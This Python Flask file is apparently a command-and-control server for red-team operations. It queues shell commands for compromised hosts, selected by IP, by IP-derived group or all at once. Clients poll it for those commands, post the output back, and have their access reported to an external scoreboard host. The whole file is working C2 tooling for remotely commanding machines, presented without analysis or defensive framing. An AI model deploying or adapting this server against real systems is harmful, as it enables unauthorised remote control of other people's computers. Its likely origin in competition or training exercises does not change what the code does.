from flask import Flask, request, jsonify, render_template
import requests
import sys
import json
from datetime import datetime
from termcolor import colored
from ipaddress import ip_address, ip_network

SERVER_URL = "http://127.0.0.1:5005"
app = Flask(__name__)
print("Drew was here")

client_commands = {} # 'client_id': 'command', 'timestamp', 'output (default none)' --> to handle commands for specific clients
clients = [] # just to see what clients we got rn
groups = {} # for same box diff teams


@app.route('/home')
def home():
    return render_template('home.html')


@app.route('/input-command', methods=['POST'])
def input():
    command_input = request.form.get('command')
    try:
        target, cmd = command_input.split(maxsplit=1) # splits it at only first occurrence of whitespace. so fire
        if target == "all":
            for c in clients:
                client_commands[c] = {'command': cmd, 'timestamp': datetime.now(), 'output': None}
        elif target in groups:
            for c in groups[target]:
                client_commands[c] = {'command': cmd, 'timestamp': datetime.now(), 'output': None}
        else: # 1 specific client
            client_commands[target] = {'command': cmd, 'timestamp': datetime.now(), 'output': None}
    except ValueError:
        return render_template('home.html', message="invalid input")
    return render_template('home.html', message=f"command for {target}: {cmd}")

# handle commands to specific clients
# syntax: [client_id/"all"/group name] [command]
@app.route('/command', methods=['GET'])
def send_command():
    client_id = request.args.get('client_id') # defaults to None apparently?
    if client_id not in clients:
        register_client(client_id)
    sendUpdate(client_id)
    cmd = client_commands.get(client_id)

    if client_id in clients: # if valid client id was parsed
        cmd_info = client_commands.get(client_id, None)
        if cmd_info and ((datetime.now() - cmd_info['timestamp']).total_seconds() < 5): # if command is valid and was issued within the last 5 secs
            return jsonify(status="sent", client_id=client_id, command=cmd_info['command']) # send to a specific client
        else:
            return jsonify(status="none", client_id=client_id) # no command to send
    return jsonify(status="sent", command=cmd) # otherwise send to all


@app.route('/register-client', methods=['GET'])
def register_client(client_id=None):
    global groups
    if not client_id:
    # client_id = request.remote_addr # ok just found out u could do this
        client_id = request.args.get('client_id') # retrieves the value associated with the key 'client_id' from the query string, or None if it does not exist
    group = client_id.split(".")[2] + "." + client_id.split(".")[3] # LAST 2 OCTETS
    if group not in groups:
        groups[group] = []
    if client_id not in groups:
        groups[group].append(client_id)

    global clients
    if client_id not in clients:
        clients.append(client_id)
    if client_id not in client_commands:
        client_commands[client_id] = {"command": None, "timestamp": datetime.min}
    return jsonify(status="client registered", client_id=client_id)

@app.route('/', methods=['POST']) # callbacks
def command_result():
    client_id = request.args.get('client_id')
    if client_id not in clients:
        register_client(client_id)
    result = request.json.get('result') # GET from client
    # wtf is a result rename that
    status = request.args.get('status')
    client_commands[client_id]['output'] = result.strip()
    print(colored("\nclient command result:\n" + result + "\n", "blue"))
    return jsonify({"status": status})

@app.route('/callbacks', methods=['GET'])
def callbacks():
    toRet = {}
    for group in groups:
        toRet[group] = []
        for item in client_commands: # item = 'client_id': 'command', 'timestamp'
            # check to put IP in correct group
            if item.split(".")[2] + "." + item.split(".")[3] == group: # need to parse the last octet of client_id in item for check
                fuck = {}
                fuck[item] = client_commands[item]
                toRet[group].append(fuck)
    return toRet

@app.route('/clients')
def show_clients():
    return clients

def sendUpdate(ips, name="leahfr"):
    host = "https://pwnboard.win/pwn/boxaccess"
    # Here ips is a list of IP addresses to update
    # If we are only updating 1 IP, use "ip" and pass a string
    data = {'ip': ips, 'type': name}
    try:
        req = requests.post(host, json=data, timeout=3)
        print(req.text)
        return True
    except Exception as E:
        print(E)
        return False

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5005, threaded=True)
    # app.run(debug=True, host='127.0.0.1', port=5000, threaded=True)